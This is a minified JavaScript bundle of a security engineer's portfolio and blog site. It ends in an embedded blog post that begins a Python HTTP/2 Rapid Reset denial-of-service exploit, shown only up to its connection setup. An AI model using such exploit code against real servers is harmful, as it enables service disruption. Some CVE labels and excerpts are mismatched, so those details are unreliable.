if((l=r)!=null&&l.v7_partialHydration&&n.length===0&&!t.initialized&&t.matches.length>0)e=t.matches;else return null}let o=e,s=(i=t)==null?void 0:i.errors;if(s!=null){let g=o.findIndex(h=>h.route.id&&(s==null?void 0:s[h.route.id])!==void 0);g>=0||K(!1),o=o.slice(0,Math.min(o.length,g+1))}let a=!1,c=-1;if(t&&r&&r.v7_partialHydration)for(let g=0;g<o.length;g++){let h=o[g];if((h.route.HydrateFallback||h.route.hydrateFallbackElement)&&(c=g),h.route.id){let{loaderData:m,errors:v}=t,w=h.route.loader&&m[h.route.id]===void 0&&(!v||v[h.route.id]===void 0);if(h.route.lazy||w){a=!0,c>=0?o=o.slice(0,c+1):o=[o[0]];break}}}return o.reduceRight((g,h,m)=>{let v,w=!1,k=null,E=null;t&&(v=s&&h.route.id?s[h.route.id]:void 0,k=h.route.errorElement||ih,a&&(c<0&&m===0?(ph("route-fallback"),w=!0,E=null):c===m&&(w=!0,E=h.route.hydrateFallbackElement||null)));let f=n.concat(o.slice(0,m+1)),d=()=>{let p;return v?p=k:w?p=E:h.route.Component?p=S.createElement(h.route.Component,null):h.route.element?p=h.route.element:p=g,S.createElement(oh,{match:h,routeContext:{outlet:g,matches:f,isDataRoute:t!=null},children:p})};return t&&(h.route.ErrorBoundary||h.route.errorElement||m===0)?S.createElement(lh,{location:t.location,revalidation:t.revalidation,component:k,error:v,children:d(),routeContext:{outlet:null,matches:f,isDataRoute:!0}}):d()},null)}var Wc=function(e){return e.UseBlocker="useBlocker",e.UseRevalidator="useRevalidator",e.UseNavigateStable="useNavigate",e}(Wc||{}),$c=function(e){return e.UseBlocker="useBlocker",e.UseLoaderData="useLoaderData",e.UseActionData="useActionData",e.UseRouteError="useRouteError",e.UseNavigation="useNavigation",e.UseRouteLoaderData="useRouteLoaderData",e.UseMatches="useMatches",e.UseRevalidator="useRevalidator",e.UseNavigateStable="useNavigate",e.UseRouteId="useRouteId",e}($c||{});function ah(e){let n=S.useContext(es);return n||K(!1),n}function uh(e){let n=S.useContext(qp);return n||K(!1),n}function ch(e){let n=S.useContext(xn);return n||K(!1),n}function Gc(e){let n=ch(),t=n.matches[n.matches.length-1];return t.route.id||K(!1),t.route.id}function dh(){var e;let n=S.useContext(Fc),t=uh(),r=Gc();return n!==void 0?n:(e=t.errors)==null?void 0:e[r]}function fh(){let{router:e}=ah(Wc.UseNavigateStable),n=Gc($c.UseNavigateStable),t=S.useRef(!1);return Uc(()=>{t.current=!0}),S.useCallback(function(i,l){l===void 0&&(l={}),t.current&&(typeof i=="number"?e.navigate(i):e.navigate(i,rr({fromRouteId:n},l)))},[e,n])}const ga={};function ph(e,n,t){ga[e]||(ga[e]=!0)}function hh(e,n){e==null||e.v7_startTransition,e==null||e.v7_relativeSplatPath}function Tn(e){K(!1)}function mh(e){let{basename:n="/",children:t=null,location:r,navigationType:i=on.Pop,navigator:l,static:o=!1,future:s}=e;ur()&&K(!1);let a=n.replace(/^\/*/,"/"),c=S.useMemo(()=>({basename:a,navigator:l,static:o,future:rr({v7_relativeSplatPath:!1},s)}),[a,s,l,o]);typeof r=="string"&&(r=mt(r));let{pathname:g="/",search:h="",hash:m="",state:v=null,key:w="default"}=r,k=S.useMemo(()=>{let E=Zo(g,a);return E==null?null:{location:{pathname:E,search:h,hash:m,state:v,key:w},navigationType:i}},[a,g,h,m,v,w,i]);return k==null?null:S.createElement(Bn.Provider,{value:c},S.createElement(Ni.Provider,{children:t,value:k}))}function gh(e){let{children:n,location:t}=e;return nh(eo(n),t)}new Promise(()=>{});function eo(e,n){n===void 0&&(n=[]);let t=[];return S.Children.forEach(e,(r,i)=>{if(!S.isValidElement(r))return;let l=[...n,i];if(r.type===S.Fragment){t.push.apply(t,eo(r.props.children,l));return}r.type!==Tn&&K(!1),!r.props.index||!r.props.children||K(!1);let o={id:r.props.id||l.join("-"),caseSensitive:r.props.caseSensitive,element:r.props.element,Component:r.props.Component,index:r.props.index,path:r.props.path,loader:r.props.loader,action:r.props.action,errorElement:r.props.errorElement,ErrorBoundary:r.props.ErrorBoundary,hasErrorBoundary:r.props.ErrorBoundary!=null||r.props.errorElement!=null,shouldRevalidate:r.props.shouldRevalidate,handle:r.props.handle,lazy:r.props.lazy};r.props.children&&(o.children=eo(r.props.children,l)),t.push(o)}),t}/**
 * React Router DOM v6.30.2
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */function no(){return no=Object.assign?Object.assign.bind():function(e){for(var n=1;n<arguments.length;n++){var t=arguments[n];for(var r in t)Object.prototype.hasOwnProperty.call(t,r)&&(e[r]=t[r])}return e},no.apply(this,arguments)}function vh(e,n){if(e==null)return{};var t={},r=Object.keys(e),i,l;for(l=0;l<r.length;l++)i=r[l],!(n.indexOf(i)>=0)&&(t[i]=e[i]);return t}function yh(e){return!!(e.metaKey||e.altKey||e.ctrlKey||e.shiftKey)}function wh(e,n){return e.button===0&&(!n||n==="_self")&&!yh(e)}const kh=["onClick","relative","reloadDocument","replace","state","target","to","preventScrollReset","viewTransition"],xh="6";try{window.__reactRouterVersion=xh}catch{}const Sh="startTransition",va=dd[Sh];function bh(e){let{basename:n,children:t,future:r,window:i}=e,l=S.useRef();l.current==null&&(l.current=Ep({window:i,v5Compat:!0}));let o=l.current,[s,a]=S.useState({action:o.action,location:o.location}),{v7_startTransition:c}=r||{},g=S.useCallback(h=>{c&&va?va(()=>a(h)):a(h)},[a,c]);return S.useLayoutEffect(()=>o.listen(g),[o,g]),S.useEffect(()=>hh(r),[r]),S.createElement(mh,{basename:n,children:t,location:s.location,navigationType:s.action,navigator:o,future:r})}const Eh=typeof window<"u"&&typeof window.document<"u"&&typeof window.document.createElement<"u",Ch=/^(?:[a-z][a-z0-9+.-]*:|\/\/)/i,Ue=S.forwardRef(function(n,t){let{onClick:r,relative:i,reloadDocument:l,replace:o,state:s,target:a,to:c,preventScrollReset:g,viewTransition:h}=n,m=vh(n,kh),{basename:v}=S.useContext(Bn),w,k=!1;if(typeof c=="string"&&Ch.test(c)&&(w=c,Eh))try{let p=new URL(window.location.href),y=c.startsWith("//")?new URL(p.protocol+c):new URL(c),b=Zo(y.pathname,v);y.origin===p.origin&&b!=null?c=b+y.search+y.hash:k=!0}catch{}let E=Jp(c,{relative:i}),f=Th(c,{replace:o,state:s,target:a,preventScrollReset:g,relative:i,viewTransition:h});function d(p){r&&r(p),p.defaultPrevented||f(p)}return S.createElement("a",no({},m,{href:w||E,onClick:k||l?r:d,ref:t,target:a}))});var ya;(function(e){e.UseScrollRestoration="useScrollRestoration",e.UseSubmit="useSubmit",e.UseSubmitFetcher="useSubmitFetcher",e.UseFetcher="useFetcher",e.useViewTransitionState="useViewTransitionState"})(ya||(ya={}));var wa;(function(e){e.UseFetcher="useFetcher",e.UseFetchers="useFetchers",e.UseScrollRestoration="useScrollRestoration"})(wa||(wa={}));function Th(e,n){let{target:t,replace:r,state:i,preventScrollReset:l,relative:o,viewTransition:s}=n===void 0?{}:n,a=Hc(),c=cr(),g=Vc(e,{relative:o});return S.useCallback(h=>{if(wh(h,t)){h.preventDefault();let m=r!==void 0?r:fi(c)===fi(g);a(e,{replace:m,state:i,preventScrollReset:l,relative:o,viewTransition:s})}},[c,a,g,r,i,t,e,l,o,s])}function Ph({onToggleTheme:e,theme:n}){const t=cr(),r=Hc(),i=t.pathname==="/blogs",l=t.pathname.startsWith("/projects"),o=t.pathname.startsWith("/certifications"),s=t.hash==="#contact"||t.pathname==="/contact",a=(c,g)=>{c.preventDefault();const h=()=>{const m=document.getElementById(g);m&&m.scrollIntoView({behavior:"smooth",block:"start"})};t.pathname!=="/"?(r("/"),setTimeout(h,80)):h()};return u.jsx("nav",{className:"navbar",children:u.jsxs("div",{className:"container nav-container",children:[u.jsxs("div",{className:"logo",children:[u.jsx("i",{className:"fas fa-mug-hot mug-icon","aria-hidden":"true"})," Portfolio | Hem Parekh"]}),u.jsxs("ul",{className:"nav-links",children:[u.jsx("li",{children:u.jsx("a",{href:"#about",onClick:c=>a(c,"about"),children:"About"})}),u.jsx("li",{children:u.jsx("a",{href:"#experience",onClick:c=>a(c,"experience"),children:"Experience"})}),u.jsx("li",{children:u.jsx(Ue,{to:"/projects",className:l?"active":"",children:"Projects"})}),u.jsx("li",{children:u.jsx(Ue,{to:"/certifications",className:o?"active":"",children:"Certs"})}),u.jsx("li",{children:u.jsx(Ue,{to:"/blogs",className:i?"active":"",children:"Blog"})}),u.jsx("li",{children:u.jsx("a",{href:"#contact",className:s?"active":"",onClick:c=>a(c,"contact"),children:"Contact"})})]}),u.jsxs("button",{className:"theme-toggle",id:"themeToggle",onClick:e,children:["Conference Room Lights: ",n==="dark"?"On":"Off"]})]})})}function _h(){return u.jsx("footer",{className:"footer",children:u.jsx("div",{className:"container",children:u.jsx("p",{children:"© 2024 Hem Parekh | All rights reserved."})})})}function Li(e=.15){const n=S.useRef(null),[t,r]=S.useState(!1);return S.useEffect(()=>{const i=n.current;if(!i)return;const l=new IntersectionObserver(([o])=>{o.isIntersecting&&(r(!0),l.unobserve(o.target))},{threshold:e});return l.observe(i),()=>l.disconnect()},[e]),[n,t]}function Nh({data:e}){const[n,t]=Li();return u.jsx("header",{className:`hero reveal ${t?"visible":""}`,id:"home",ref:n,children:u.jsxs("div",{className:"hero-content container",children:[u.jsxs("div",{className:"hero-copy",children:[u.jsx("div",{className:"hero-badge",children:"Assistant to the Regional Security Engineer"}),u.jsxs("h1",{children:["Hello, I'm ",u.jsx("span",{className:"highlight",children:e.highlight}),"."]}),u.jsxs("div",{className:"hero-descriptors",children:[u.jsx("span",{className:"pill",children:"Security Engineer"}),u.jsx("span",{className:"pill",children:"Pen Tester"})]}),u.jsx("p",{className:"hero-funfact",children:"Fun fact: Bears. Beets. Battlestar Encryption."}),u.jsx("p",{children:e.blurb}),u.jsxs("div",{className:"hero-ctas",children:[u.jsx(Ue,{className:"button primary clipboard",to:"/projects",children:"View Projects"}),u.jsx(Ue,{className:"button ghost clipboard",to:"/certifications",children:"View Certificates"})]}),u.jsx("div",{className:"scroll-down-arrow",children:u.jsx("a",{href:"#about",className:"arrow-link",children:u.jsx("span",{children:"↓"})})})]}),u.jsx("div",{className:"hero-photo-card",children:u.jsx("div",{className:"polaroid",children:u.jsx("img",{src:e.image,className:"heading-image",alt:"Heading"})})})]})})}function Lh({links:e=[]}){return u.jsx("div",{className:"social-icons",children:e.map(n=>u.jsx("a",{href:n.href,target:"_blank",rel:"noreferrer","aria-label":n.label||"Social link",children:u.jsx("i",{className:n.icon})},n.href))})}function Oh({data:e,socials:n}){const[t,r]=Li();return u.jsx("section",{className:`about reveal ${r?"visible":""}`,id:"about",ref:t,children:u.jsxs("div",{className:"container about-container",children:[u.jsx("div",{className:"about-photo",children:u.jsx("img",{src:e.image,alt:"Hem Parekh",style:{maxWidth:"100%",borderRadius:"10px"}})}),u.jsxs("div",{className:"about-content",children:[u.jsx("h2",{children:e.title}),u.jsx("p",{children:e.text}),u.jsx(Lh,{links:n})]})]})})}const jh={"Privacy Engineer":{domains:["Privacy","Cloud"],impact:"High",capabilities:{"Privacy Reviews":!0,"Threat Modeling":!0,Automation:!0,Compliance:!0,"Incident Response":!1,"Pen Testing":!1},tools:["AWS","Splunk","Python","Terraform"],outcome:"Cut data exposure paths; embedded privacy-by-design across services. Declared 'World’s Best Pen Tester' (self-awarded mug).",actions:[]},"Cybersecurity Engineer Intern":{domains:["AppSec","Infra"],impact:"High",capabilities:{"Pen Testing":!0,"Threat Modeling":!0,Automation:!0,Compliance:!0,"Incident Response":!1,"Privacy Reviews":!1},outcome:"8 critical issues fixed; 25+ web apps hardened.",actions:[]},"Research Assistant":{domains:["Research","Compliance"],impact:"Medium",capabilities:{Compliance:!0,"Threat Modeling":!0,"Privacy Reviews":!0,Automation:!1,"Pen Testing":!1,"Incident Response":!1},tools:["NIST 800-53","ISO 27001","Python"],outcome:"Risk assessments aligned to NIST/ISO; controls implemented with teams.",actions:[]},"Cybersecurity Analyst Intern":{domains:["AppSec","Infra"],impact:"Medium",capabilities:{"Pen Testing":!0,"Threat Modeling":!0,Compliance:!0,Automation:!1,"Incident Response":!1,"Privacy Reviews":!1},tools:["Nessus","Burp","Splunk"],outcome:"Assessed 18 internal systems; delivered remediation guidance.",actions:[]},"Security Operational Analyst (SOC)":{domains:["Detection","Operations"],impact:"Medium",capabilities:{"Incident Response":!0,"Threat Modeling":!1,"Pen Testing":!1,Compliance:!1,Automation:!0,"Privacy Reviews":!1},outcome:"Monitored 100+ devices; improved alert handling and root-cause analysis.",actions:[]}};function Rh({item:e,idx:n}){const[t,r]=Li(),i=jh[e.role]||{},l=i.domains||[],o=i.capabilities||{},s=i.actions||[e.desc];return u.jsxs("article",{className:`exp-card reveal ${r?"visible":""} card-hover`,ref:t,style:{transitionDelay:`${n*80}ms`},children:[u.jsxs("header",{className:"exp-card-header",children:[u.jsxs("div",{children:[u.jsx("h3",{children:e.role}),u.jsx("h4",{children:e.org})]}),u.jsx("div",{className:"exp-dates",children:e.range})]}),u.jsxs("div",{className:"exp-chips",children:[l.map(a=>u.jsx("span",{className:"pill",children:a},a)),i.impact&&u.jsxs("span",{className:"pill impact",children:["Impact: ",i.impact]})]}),u.jsx("div",{className:"exp-outcome",children:i.outcome||e.desc}),u.jsx("div",{className:"exp-capabilities",children:Object.entries(o).map(([a,c])=>u.jsxs("div",{className:`exp-cap ${c?"on":"off"}`,children:[u.jsx("span",{className:"dot-cap"}),a]},a))}),u.jsx("ul",{className:"exp-actions",children:s.map(a=>u.jsx("li",{children:a},a))})]},`${e.range}-${e.role}`)}function Ah({items:e}){const[n,t]=Li(.1);return u.jsx("section",{className:`experience reveal ${t?"visible":""}`,id:"experience",ref:n,children:u.jsxs("div",{className:"container",children:[u.jsx("div",{className:"section-header",children:u.jsxs("div",{children:[u.jsx("h2",{children:"EXPERIENCE"}),u.jsx("p",{className:"section-subtitle",children:"Jim would absolutely look into the camera right now."})]})}),u.jsx("div",{className:"experience-grid",children:e.map((r,i)=>u.jsx(Rh,{item:r,idx:i},`${r.range}-${r.role}`))})]})})}const Mh=[{href:"https://github.com/Hem1700",icon:"fab fa-github",label:"GitHub"},{href:"https://www.linkedin.com/in/hem-parekh/",icon:"fab fa-linkedin-in",label:"LinkedIn"},{href:"https://medium.com/@hemparekh1596",icon:"fab fa-medium",label:"Medium"},{href:"https://tryhackme.com/r/p/beatmonk",icon:"fas fa-terminal",label:"TryHackMe"},{href:"https://app.hackthebox.com/profile/overview",icon:"fas fa-user-secret",label:"HackTheBox"}],Ih={title:"Hello, I'm Hem Parekh.",highlight:"Hem Parekh",image:"/images/heading_image.webp",blurb:"I’m a Security Engineer & Pen Tester, enthusiastic about building robust software and hunting vulnerabilities."},Dh={title:"ABOUT ME",image:"/images/profile.jpeg",text:`I’m Hem Parekh, a Security Engineer and Pen Tester who thrives on building robust software 
        and unearthing vulnerabilities. I blend engineering expertise with a hacker’s curiosity to design 
        secure solutions. Outside of code and exploits, I enjoy blogging about my discoveries and advocating 
        for a safer digital world.`},zh=[{range:"Mar 2025 - Present",role:"Privacy Engineer",org:"Amazon",desc:"Driving privacy-by-design reviews and mitigating data exposure risks across services; partnering with engineering teams to embed controls and streamline compliance."},{range:"May 2024 - Dec 2024",role:"Cybersecurity Engineer Intern",org:"Toshiba Global Commerce Solution",desc:"Conducted penetration testing on over 25 web applications, identifying critical vulnerabilities, automating processes, and improving operational efficiency."},{range:"Jan 2023 - Aug 2023",role:"Research Assistant",org:"Rochester Institute of Technology",desc:"Applied knowledge of security standards, including NIST SP 800-53 and ISO/IEC 27001, conducting risk assessments and implementing controls to mitigate risks effectively."},{range:"Sep 2023 - May 2024",role:"Cybersecurity Analyst Intern",org:"Langan Engineering and Environmental Services",desc:"Conducted vulnerability assessments and penetration tests across 18 internal systems, contributing to enterprise security and developing NIST-27001-compliant documentation."},{range:"June 2021 - July 2022",role:"Security Operational Analyst (SOC)",org:"RNS Technology",desc:"Monitored 100+ security devices, responded to threat alerts, and conducted root cause analyses to enhance system security and data integrity."}],Bh=[{title:"Phish Analyzer Tool",description:"A patented desktop application designed to analyze and secure against phishing emails, featuring sandbox configurations, advanced security mechanisms, and a user-friendly interface to enhance threat detection and response.",href:"https://github.com/Hem1700/sita",tags:["Security","Desktop"]},{title:"Secure Communication Using Image Exif Data",description:"Explored the innovative use of image Exif data for covert communication. Developed methodologies for securely embedding and transmitting sensitive information through image metadata.",href:"https://drive.google.com/file/d/1WcmhCJQN_b8jad3dQoGplBmO6EN1leYZ/view?usp=sharing",tags:["Research","Security"]},{title:"Architecture and Advancement in Virtualization of TPM",description:"Explored the architecture and advancements of virtual Trusted Platform Modules (vTPMs) in virtual and cloud environments. The project highlighted security flaws, key-sharing mechanisms, and the migration challenges associated with vTPMs, proposing solutions for enhanced security and trust in virtualization.",href:"https://drive.google.com/file/d/1Y2vyRjVBgjy6QB9_qn_taJUrYCodehHT/view?usp=sharing",tags:["Research","Cloud"]},{title:"Quantum Key Distribution",description:"This project delves into the rapidly evolving field of quantum cryptography, focusing on Quantum Key Distribution (QKD). It explores innovative methods to increase QKD transmission distance while maintaining secure data transmission, addressing challenges such as key generation rates, distance limitations, and potential vulnerabilities.",href:"https://drive.google.com/file/d/17vZRyJyKYX7CmUgC1iBQf4buEsBgoC30/view?usp=sharing",tags:["Research","Cryptography"]},{title:"SecTool: The Comprehensive Cybersecurity Toolkit",description:"SecTool is a versatile cybersecurity toolkit with features like keylogging, OSINT, payload generation, hash cracking, network analysis, social engineering tools, web vulnerability detection, and more. It’s a comprehensive solution for security testing and digital defense.",href:"https://github.com/Hem1700/sectool",tags:["Security","Toolkit"]},{title:"Website Crawler",description:"A lightweight and efficient web crawler designed to scrape, analyze, and extract data from websites, enabling seamless data collection for various use cases.",href:"https://github.com/Hem1700/Website-crawler",tags:["Web","Automation"]}],Fh=[{title:"CompTIA Security+",details:"Issued Oct 2024 by CompTIA - Expires Oct 2027",href:"https://www.credly.com/badges/7270d02f-a0d1-483a-8000-8ebd2b628391/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"CompTIA Pentest+",details:"Issued Oct 2024 by CompTIA - Expires Oct 2027",href:"https://www.credly.com/badges/d93ed2a7-c86b-42ec-b4e4-7a7d2a2cd972/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"CompTIA CySA+",details:"Issued Nov 2024 by CompTIA - Expires Nov 2027",href:"https://www.credly.com/badges/d6a9802e-23b8-4a0a-83e1-edc7e89a457c/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"CompTIA Network Vulnerability Assessment Professional (CVNP)",details:"Issued Oct 2024 by CompTIA - Expires Oct 2027",href:"https://www.credly.com/badges/59404c7e-7680-45a9-8622-2a76f603c0c7/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"CompTIA Security Analytics Professional (CSAP)",details:"Issued Nov 2024 by CompTIA - Expires Nov 2027",href:"https://www.credly.com/badges/8c6cca3e-0eb1-4920-8eff-826998743336/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"CompTIA Network Security Professional (CNSP)",details:"Issued Nov 2024 by CompTIA - Expires Nov 2027",href:"https://www.credly.com/badges/08f2dd46-295b-402c-bc67-29189bea83ff/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"ICS2 Certified in Cybersecurity (CC)",details:"Issued Oct 2024 - Expires Oct 2027",href:"https://www.credly.com/badges/c16c4d43-1e84-44ab-bebe-38d747073ccb/linked_in_profile",domain:"Security",issuer:"ISC2"},{title:"AWS Certified Cloud Practitioner (CCP)",details:"Issued Mar 2024 - Expires Mar 2027",href:"https://www.credly.com/badges/6a0d691b-b3b2-4d44-addb-f2b5b171e83d/linked_in_profile",domain:"Cloud",issuer:"AWS"},{title:"Microsoft Azure Security, Compliance and Identity Fundamentals (SC-900)",details:"Issued Sep 2024 by Microsoft - No expiration",href:"https://learn.microsoft.com/api/credentials/share/en-us/HemParekh-9873/BD2B5E59D28A7F54?sharingId=1D33B191273E7834",domain:"Cloud",issuer:"Microsoft"},{title:"Microsoft Azure Fundamentals (AZ-900)",details:"Issued Sep 2024 by Microsoft - No expiration",href:"https://learn.microsoft.com/api/credentials/share/en-gb/HemParekh-9873/8B3B97F4E45B9F2C?sharingId",domain:"Cloud",issuer:"Microsoft"},{title:"CCNA: Introduction to Networks",details:"Issued Jun 2020 by Cicso - No expiration",href:"https://www.credly.com/badges/be753401-bd44-4d09-81d7-33af049e6fad/linked_in_profile",domain:"Networking",issuer:"Cisco"},{title:"Cisco: Endpoint Security",details:"Issued Nov 2024 by Cicso - No expiration",href:"https://www.credly.com/badges/9e4309a6-089f-4259-8333-c9c501666c77/linked_in_profile",domain:"Security",issuer:"Cisco"}],Uh={title:"Hi there 👋, welcome to my Blog",subtitle:"This is where I talk about my projects and everything that I find interesting in Cybersecurity.",social:[{href:"#",icon:"fab fa-twitter"},{href:"#",icon:"fab fa-linkedin-in"},{href:"#",icon:"fab fa-github"},{href:"#",icon:"fab fa-instagram"}]},to=[{slug:"firmware_llm_annotator",title:"Firmware Exploration: LLM as Your Annotator",href:"/blog/firmware_llm_annotator",excerpt:"How to use an LLM as a helper for firmware reversing: triaging strings, summarizing decompiled functions, and annotating config blobs while you stay in control of the analysis.",date:"November 30, 2025",readTime:"5 min read"},{slug:"1001",title:"CVE-2024–1001",href:"/blog/1001",excerpt:"Kubernetes relies heavily on Role-Based Access Control (RBAC) to manage permissions. However, in early 2024, CVE-2024–1001 was disclosed, revealing how misconfigured RBAC rules in Kubernetes could allow attackers to gain full control over a cluster. This vulnerability emphasizes the risks of poorly defined access policies.",date:"September 8, 2024",readTime:"3 min read"},{slug:"0012",title:"CVE-2024–0012",href:"/blog/0012",excerpt:"CVE-2024–0012, known as the HTTP/2 Rapid Reset Attack, was disclosed, affecting major web servers like Apache and Nginx. This denial-of-service (DoS) vulnerability exploits HTTP/2’s stream management system by abusing the RST_STREAM frame. By overwhelming the server with rapid stream resets, attackers can exhaust resources and disrupt services.",date:"September 8, 2024",readTime:"3 min read"},{slug:"40982",title:"CVE-2022–40982",href:"/blog/40982",excerpt:"A critical vulnerability, CVE-2022–40982, dubbed Downfall, was disclosed. This vulnerability affects Intel x86–64 processors and exploits speculative execution to access sensitive data stored in vector registers. It impacts both consumer CPUs and server-grade Xeon processors, allowing attackers with local access to bypass security boundaries and potentially extract confidential information like encryption keys or passwords.",date:"September 8, 2024",readTime:"3 min read"},{slug:"cow",title:"CVE-2016–5195",href:"/blog/cow",excerpt:"In 2016, a critical vulnerability in the Linux kernel, known as Dirty Cow (CVE-2016–5195), was disclosed. This privilege escalation flaw exploited a race condition in the kernel’s memory management system, allowing attackers to write to read-only memory mappings. The name “Dirty Cow” comes from its exploitation of the Copy-On-Write (COW) mechanism in Linux.",date:"September 8, 2024",readTime:"3 min read"},{slug:"symlinks",title:"Symbolic Links (Symlinks) in Linux",href:"/blog/symlinks",excerpt:"TIn Linux, symbolic links are essentially shortcuts that point to other files or directories. They allow you to reference a file or directory without duplicating its contents. To know more read the blog.",date:"September 8, 2024",readTime:"3 min read"},{slug:"23397",title:"CVE-2023–23397",href:"/blog/23397",excerpt:"This blog will break down the ROBOT attack, provide examples, and discuss mitigations to protect vulnerable systems.",date:"September 8, 2024",readTime:"3 min read"},{slug:"0160",title:"CVE-2014-0160",href:"/blog/0160",excerpt:"Heartbleed’s simplicity and devastating impact exposed the internet’s underlying fragility, and despite extensive efforts to patch affected systems, its ghost still haunts forgotten and neglected systems today. Let’s explore the technical details of this vulnerability, the global chaos it caused, and why it’s still relevant.",date:"September 8, 2024",readTime:"3 min read"},{slug:"11882",title:"CVE-2017-11882",href:"/blog/11882",excerpt:"One of the most notorious among these is CVE-2017–11882, commonly known as the Microsoft Office Memory Corruption Vulnerability. Originating in 2000, this vulnerability remains a frequently exploited entry point for attackers worldwide, from nation-state actors to cyber criminals.",date:"October 26 2024",readTime:"3 min read"},{slug:"robot",title:"ROBOT (Return of Bleichenbacher’s Oracle Threat) Attack",href:"/blog/robot",excerpt:"This blog will break down the ROBOT attack, provide examples, and discuss mitigations to protect vulnerable systems.",date:"September 8, 2024",readTime:"3 min read"},{slug:"poodle",title:"ZOMBIE POODLE and GOLDENDOODLE ATTACKS",href:"/blog/poodle",excerpt:"This blog provides an in-depth look at Zombie Poodle and Goldendoodle attacks, how they work, and their implications for modern cybersecurity.",date:"September 6, 2024",readTime:"6 min read"}];function ka(){return u.jsxs(u.Fragment,{children:[u.jsx(Nh,{data:Ih}),u.jsx(Ah,{items:zh}),u.jsx(Oh,{data:Dh,socials:Mh})]})}function Hh({data:e}){return u.jsx("header",{className:"blog-welcome-section",children:u.jsxs("div",{className:"container text-center",children:[u.jsxs("h1",{children:["Hi there ",u.jsx("span",{className:"wave",children:"👋"}),", welcome to my Blog"]}),u.jsx("p",{className:"blog-subtitle",children:e.subtitle})]})})}function Vh({posts:e,page:n=1,totalPages:t=1,onPageChange:r}){return u.jsx("section",{className:"blog-list-section",children:u.jsxs("div",{className:"container",children:[e.map(i=>u.jsxs("article",{className:"blog-row",children:[u.jsxs("div",{className:"blog-row-meta",children:[u.jsx("div",{className:"blog-row-date",children:i.date}),u.jsx("div",{className:"blog-row-time",children:i.readTime})]}),u.jsxs("div",{className:"blog-row-body",children:[u.jsx(Ue,{to:i.href,className:"blog-row-title",children:i.title}),u.jsx("p",{className:"blog-row-excerpt",children:i.excerpt}),u.jsx("div",{className:"blog-tags",children:u.jsx("span",{className:"pill",children:"Security"})})]}),u.jsx("div",{className:"blog-row-cta",children:u.jsx(Ue,{to:i.href,className:"view-credentials",children:"Read"})})]},i.title)),t>1&&u.jsxs("div",{className:"blog-pagination",children:[u.jsx("button",{className:"pill",disabled:n===1,onClick:()=>r==null?void 0:r(Math.max(1,n-1)),children:"Previous"}),u.jsxs("span",{className:"blog-page-indicator",children:["Page ",n," of ",t]}),u.jsx("button",{className:"pill",disabled:n===t,onClick:()=>r==null?void 0:r(Math.min(t,n+1)),children:"Next"})]})]})})}function Wh({posts:e,onFilter:n}){const[t,r]=S.useState(""),i=S.useMemo(()=>t.trim()?e.filter(o=>o.title.toLowerCase().includes(t.toLowerCase())||o.excerpt.toLowerCase().includes(t.toLowerCase())):e,[t,e]),l=o=>{r(o.target.value),n(i)};return u.jsxs("div",{className:"blog-search",children:[u.jsx("label",{className:"search-label",htmlFor:"blog-search",children:"Search posts"}),u.jsxs("div",{className:"search-shell",children:[u.jsx("i",{className:"fas fa-search search-icon","aria-hidden":"true"}),u.jsx("input",{id:"blog-search",type:"search",value:t,onChange:l,placeholder:"Type a keyword…",className:"search-input"})]})]})}function $h(){const[e,n]=S.useState(to),[t,r]=S.useState(1),i=5,l=Math.max(1,Math.ceil(e.length/i)),o=e.slice((t-1)*i,t*i),s=a=>{n(a),r(1)};return u.jsxs(u.Fragment,{children:[u.jsx(Hh,{data:Uh}),u.jsx("div",{className:"container blog-controls",children:u.jsx(Wh,{posts:to,onFilter:s})}),u.jsx(Vh,{posts:o,page:t,totalPages:l,onPageChange:r})]})}const Gh=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>CVE-2024–0012: HTTP/2 Rapid Reset Attack Explained</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">CVE-2024–0012: HTTP/2 Rapid Reset Attack Explained</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What is CVE-2024–0012?</h2>
        <p>
          CVE-2024–0012, known as the HTTP/2 Rapid Reset Attack, was disclosed, affecting major web servers like Apache and Nginx. This denial-of-service (DoS) vulnerability exploits HTTP/2’s stream management system by abusing the RST_STREAM frame. By overwhelming the server with rapid stream resets, attackers can exhaust resources and disrupt services.
        </p>

        <h2>How the Vulnerability Works</h2>
        <h3>HTTP/2 and RST_STREAM</h3>
        <p>
          HTTP/2 allows multiplexing multiple streams over a single connection. The RST_STREAM frame cancels streams when they are no longer needed. However, attackers can send a rapid series of RST_STREAM frames, forcing the server to process and discard streams at an unsustainable rate, leading to resource exhaustion.
        </p>

        <h2>Exploit Code Example</h2>
        <p>
          Below is an educational example in Python that demonstrates how an attacker could exploit this vulnerability using an HTTP/2 library.
        </p>
        <div class="code-block">
          <code>
import h2.connection<br>
import h2.events<br>
import socket<br>
import ssl<br>
import time<br><br>

# Configure target server<br>
TARGET_HOST = "vulnerable-server.com"<br>
TARGET_PORT = 443<br>
STREAM_COUNT = 1000  # Number of streams to abuse<br><br>

def send_reset_attack():<br>
    # Establish SSL/TLS connection<br>
    context = ssl.create_default_context()<br>
    with socket.create_connection((TARGET_HOST, TARGET_PORT)) as raw_sock:<br>
        with context.wrap_socket(raw_sock, server_hostname=TARGET_HOST) as tls_sock:<br>
            # Initialize HTTP/2 connection<br>
